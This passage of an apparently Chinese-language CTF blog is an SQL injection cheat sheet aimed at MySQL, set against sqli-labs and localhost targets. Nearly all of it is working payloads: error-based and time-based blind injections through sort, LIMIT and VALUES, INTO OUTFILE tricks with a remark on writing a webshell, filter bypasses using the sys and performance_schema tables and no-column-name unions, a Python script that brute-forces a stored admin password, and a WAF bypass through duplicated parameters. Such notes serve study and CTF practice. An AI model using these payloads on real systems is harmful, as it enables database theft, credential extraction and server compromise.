<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> concat(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)))</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>利用and ?sort&#x3D;1 and(sql语句)</p>
<ul>
<li>这里的sql语句可以用延时注入</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">116</span>,<span class="number">0</span>,sleep(<span class="number">5</span>))</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="procedure-analyse-参数后注入"><a href="#procedure-analyse-参数后注入" class="headerlink" title="procedure analyse 参数后注入"></a>procedure analyse 参数后注入</h3><p>此方法适用于MySQL 5.x中，在limit语句后面的注入 利用procedure analyse 参数，我们可以执行报错注入。</p>
<p>同时，在procedure analyse 和order by 之间可以存在limit 参数，我们在实际应用中，往往也可能会存在limit 后的注入，可以利用procedure analyse 进行注入</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-46</span><span class="operator">/</span>?sort<span class="operator">=</span><span class="number">1</span>  <span class="keyword">procedure</span> analyse(extractvalue(rand(),con</span><br><span class="line">cat(<span class="number">0x3a</span>,version())),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">SELECT</span> field <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> id <span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>); </span><br><span class="line"># 如果不支持报错注入的话，还可以基于时间注入：</span><br><span class="line"><span class="keyword">SELECT</span> field <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> id <span class="operator">&gt;</span> <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(IF(MID(version(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, BENCHMARK(<span class="number">5000000</span>,SHA1(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="导入导出文件into-outfile-参数"><a href="#导入导出文件into-outfile-参数" class="headerlink" title="导入导出文件into outfile 参数"></a>导入导出文件into outfile 参数</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-46</span><span class="operator">/</span>?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">into</span> outfile &quot;c:\\wamp\\www\\sqllib\\test</span><br><span class="line">1.txt&quot;</span><br><span class="line"># 将查询结果导入到文件当中</span><br><span class="line"># 那这个时候我们可以考虑上传网马，利用lines terminated <span class="keyword">by</span></span><br><span class="line"><span class="keyword">Into</span> outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated <span class="keyword">by</span> <span class="number">0</span>x(网马进行<span class="number">16</span> 进制转</span><br><span class="line">换)</span><br></pre></td></tr></table></figure></div>

<h2 id="六、常见bypass"><a href="#六、常见bypass" class="headerlink" title="六、常见bypass"></a>六、常见bypass</h2><p><a class="link"   target="_blank" rel="noopener" href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" >SQL注入绕过技巧 | 瓦都剋 (dropsec.xyz) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Information-schema被屏蔽或过滤or时"><a href="#Information-schema被屏蔽或过滤or时" class="headerlink" title="Information_schema被屏蔽或过滤or时"></a>Information_schema被屏蔽或过滤or时</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512" >聊一聊bypass information_schema - 安全客，安全资讯平台 (anquanke.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="MySQL5-7的新特性"><a href="#MySQL5-7的新特性" class="headerlink" title="MySQL5.7的新特性"></a>MySQL5.7的新特性</h4><blockquote>
<p>由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</p>
</blockquote>
<h4 id="innodb表–查找当前数据库的现存表"><a href="#innodb表–查找当前数据库的现存表" class="headerlink" title="innodb表–查找当前数据库的现存表"></a><strong>innodb表</strong>–查找当前数据库的现存表</h4><p>MySQL 5.6 及以上版本存在innodb_index_stats，innodb_table_stats两张表，其中包含新建立的库和表</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name <span class="operator">=</span> database(); # 返回去重过后的表名(简洁)</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> mysql.innodb_index_stats <span class="keyword">where</span> database_name <span class="operator">=</span> database(); # 返回值中会出现重复的表名</span><br></pre></td></tr></table></figure></div>

<h4 id="sys表"><a href="#sys表" class="headerlink" title="sys表"></a>sys表</h4><p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#包含<span class="keyword">in</span></span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `sys`.`x$innodb_buffer_stats_by_table` <span class="keyword">where</span> object_schema <span class="operator">=</span> database();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `sys`.`innodb_buffer_stats_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_index_statistics` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`schema_auto_increment_columns` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> sys.schema_table_statistics <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_schema;</span><br><span class="line">#不包含<span class="keyword">in</span></span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_flattened_keys` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$ps_schema_table_statistics_io` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> `sys`.`x$schema_table_statistics_with_buffer` <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> table_schema <span class="keyword">FROM</span> sys.x$schema_flattened_keys <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_schema;</span><br><span class="line">#通过表文件的存储路径获取表名</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`io_global_by_file_by_bytes` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`io_global_by_file_by_latency` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> FILE <span class="keyword">FROM</span> `sys`.`x$io_global_by_file_by_bytes` <span class="keyword">WHERE</span> FILE REGEXP DATABASE();</span><br><span class="line"></span><br><span class="line">#查询指定库的表（若无则说明此表从未被访问）</span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> sys.schema_table_statistics <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;mspwd&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_name;</span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> sys.x$schema_flattened_keys <span class="keyword">WHERE</span> table_schema<span class="operator">=</span><span class="string">&#x27;mspwd&#x27;</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> table_name;</span><br><span class="line">#统计所有访问过的表次数:库名,表名,访问次数</span><br><span class="line"><span class="keyword">select</span> table_schema,table_name,<span class="built_in">sum</span>(io_read_requests<span class="operator">+</span>io_write_requests) io <span class="keyword">from</span> sys.schema_table_statistics <span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">table_schema,table_name <span class="keyword">order</span> <span class="keyword">by</span> io <span class="keyword">desc</span>;</span><br><span class="line">#查看所有正在连接的用户详细信息</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>,db,command,current_statement,last_statement,<span class="type">time</span> <span class="keyword">FROM</span> sys.session;</span><br><span class="line">#查看所有曾连接数据库的IP,总连接次数</span><br><span class="line"><span class="keyword">SELECT</span> host,total_connections <span class="keyword">FROM</span> sys.host_summary;</span><br><span class="line"># 包含之前查询记录的表</span><br><span class="line"><span class="keyword">SELECT</span> QUERY <span class="keyword">FROM</span> sys.x$statement_analysis <span class="keyword">WHERE</span> QUERY REGEXP DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> QUERY <span class="keyword">FROM</span> `sys`.`statement_analysis` <span class="keyword">where</span> QUERY REGEXP DATABASE();</span><br></pre></td></tr></table></figure></div>

<h4 id="performance-schema表"><a href="#performance-schema表" class="headerlink" title="performance_schema表"></a>performance_schema表</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`objects_summary_global_by_type` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_handles` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_index_usage` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line"><span class="keyword">SELECT</span> object_name <span class="keyword">FROM</span> `performance_schema`.`table_lock_waits_summary_by_table` <span class="keyword">WHERE</span> object_schema <span class="operator">=</span> DATABASE();</span><br><span class="line">#包含之前查询记录的表</span><br><span class="line"><span class="keyword">SELECT</span> digest_text <span class="keyword">FROM</span> `performance_schema`.`events_statements_summary_by_digest` <span class="keyword">WHERE</span> digest_text REGEXP DATABASE();</span><br><span class="line">#包含表文件路径的表</span><br><span class="line"><span class="keyword">SELECT</span> file_name <span class="keyword">FROM</span> `performance_schema`.`file_instances` <span class="keyword">WHERE</span> file_name REGEXP DATABASE();</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032232923.jpg"
                      alt="image-20220707221836224"
                ><figcaption>image-20220707221836224</figcaption></figure></p>
<blockquote>
<p>上诉表格中虽然有能够查列名的表，但是查出来的数据都不全，当知道flag所在的库和表名时，但无法获取到列名，就需要利用无列名盲注了</p>
</blockquote>
<h4 id="join无列名注入-payload"><a href="#join无列名注入-payload" class="headerlink" title="join无列名注入 payload"></a>join无列名注入 payload</h4><p><strong>join … using(xx)</strong></p>
<p>查表名</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>Union all 与union 的区别是增加了去重的功能</p>
</blockquote>
<p>查列名(适用于逗号被过滤)</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">union</span> <span class="keyword">select</span> 重命名法</span><br><span class="line"><span class="keyword">select</span> c <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> a, <span class="number">1</span> <span class="keyword">as</span> b, <span class="number">1</span> <span class="keyword">as</span> c <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test)x limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>;</span><br><span class="line">#无逗号，有<span class="keyword">join</span>版本</span><br><span class="line"><span class="keyword">select</span> a <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> `a`)m <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span> `b`)n <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span> `c`)t <span class="keyword">where</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test)x;</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users b)c<span class="comment">--+</span></span><br><span class="line"># 获取第一列的列名</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,username))c<span class="comment">--+</span></span><br><span class="line"># 获取次列及后续列名</span><br></pre></td></tr></table></figure></div>

<h4 id="union-select重命名法"><a href="#union-select重命名法" class="headerlink" title="union select重命名法"></a><code>union select重命名法</code></h4><p>不获取列名情况下查列,以查第二列为例</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(b) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br><span class="line"># 也可以查多个列</span><br><span class="line"><span class="keyword">select</span> concat(`<span class="number">2</span>`,<span class="number">0x2d</span>,`<span class="number">3</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin)a limit <span class="number">1</span>,<span class="number">3</span>;</span><br><span class="line"># <span class="number">0x2d</span>会转换成字符<span class="string">&#x27;-&#x27;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>这里将第二列取别名为b(如果反引号&#96;没被过滤，可以不取别名，直接用⬇️)</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">from</span> ……</span><br></pre></td></tr></table></figure></div>

<p>结尾的a可以替换成任意字符，这是用来命名的</p>
<p>原理是联合查询时列名显示的是前一个select的结果，这里第一个select是<code>select 1,2 as b,3 </code>将列名重命名为1 b 3，然后再将这个新表命名为a，再进行查询</p>
</blockquote>
<h3 id="select被过滤"><a href="#select被过滤" class="headerlink" title="select被过滤"></a>select被过滤</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/275528.html" >基于mysql8特性的sql注入 - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>mysql 8.0.19<code>新增语句</code>table </p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">table</span> users; <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>table不能加where子句，不允许行过滤，显示所有列，但可以用来盲注表名</p>
</blockquote>
<h4 id="table盲注脚本"><a href="#table盲注脚本" class="headerlink" title="table盲注脚本"></a>table盲注脚本</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#orio1e</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">	result=<span class="string">&#x27;0x&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">		result+=<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line">dic=[<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>,]  <span class="comment"># 字典</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">35</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">		<span class="built_in">print</span>(dic[j])</span><br><span class="line">		url=<span class="string">&quot;http://127.0.0.1:8010&quot;</span></span><br><span class="line">		<span class="comment">#第一个字段</span></span><br><span class="line">		<span class="comment">#结果:1</span></span><br><span class="line">		payload=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;asd\\&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;||(&#123;&#125;,0x21,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="built_in">format</span>(str2hex(result+dic[j]))&#125;</span><br><span class="line">		<span class="comment">#爆第二个字段</span></span><br><span class="line">		<span class="comment">#结果:guest</span></span><br><span class="line">		payload=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;asd\\&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;||(0x31,&#123;&#125;,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="built_in">format</span>(str2hex(result+dic[j]))&#125;</span><br><span class="line">		<span class="comment">#爆第三个字段</span></span><br><span class="line">		<span class="comment">#结果:123456</span></span><br><span class="line">		<span class="comment">#因为最后一个字符完成后长度相等又判断为假 所以最后一个字符应为其下一个字母</span></span><br><span class="line">		<span class="comment">#但是这仅限最后一个字段</span></span><br><span class="line">		<span class="comment">#所以正确结果是we1c0mehacker </span></span><br><span class="line">		payload=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;asd\\&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;||(0x31,0x61646d696e,&#123;&#125;)&lt;(table/**/users/**/limit/**/1)#&quot;</span>.<span class="built_in">format</span>(str2hex(result+dic[j]))&#125;</span><br><span class="line">		</span><br><span class="line">		res=requests.post(url=url,data=payload)</span><br><span class="line">		<span class="built_in">print</span>(payload)</span><br><span class="line">		<span class="built_in">print</span>(res.text[-<span class="number">20</span>:])</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;emmmmm&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="string">&quot;no&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">			<span class="comment">#返回假时表示上一个字母即为正确结果</span></span><br><span class="line">			result+=dic[j-<span class="number">1</span>]</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>注意往前回溯</p>
<p>mysql比较，从第一个字符还是比较ascii的大小，一次往后 ,并且多列的比较时从第一列的第一位开始的</p>
<p>mysql中对char型大小写是不敏感的，盲注的时候要么可以使用hex或者binary。</p>
</blockquote>
<h4 id="values注入"><a href="#values注入" class="headerlink" title="values注入"></a>values注入</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;$log&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;testsetset&#x27;</span><span class="keyword">or</span> sleep(<span class="number">5</span>)) # <span class="string">&#x27;);</span></span><br><span class="line"><span class="string">insert into `test`.`log`(`log`) VALUES(&#x27;</span>testsetset<span class="string">&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e))) # &#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `test`.`log`(`log`) <span class="keyword">VALUES</span>(<span class="string">&#x27;1&#x27;</span><span class="operator">+</span>if((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),sleep(<span class="number">2</span>),<span class="number">1</span>)) # <span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure></div>

<p>可以利用联合注入代替order by</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032232669.jpg"
                      alt="image-20220707223820177"
                ><figcaption>image-20220707223820177</figcaption></figure></p>
<h3 id="WAF绕过–服务器解析漏洞"><a href="#WAF绕过–服务器解析漏洞" class="headerlink" title="WAF绕过–服务器解析漏洞"></a>WAF绕过–服务器解析漏洞</h3><p>index.php?id&#x3D;1&amp;id&#x3D;2</p>
<blockquote>
<p>apache（php）解析最后一个参数，即显示id&#x3D;2 的内容。Tomcat（jsp）解析第一个参数，即显示id&#x3D;1 的内容。</p>
<p>我们往往在tomcat 服务器处做数据过滤和处理，功能类似为一个WAF，因此可以传入第一个为合法参数，第二个采用注入</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/202407032232308.jpg"
                      alt="image-20220708192908674"
                ><figcaption>image-20220708192908674</figcaption></figure></p>
</blockquote>
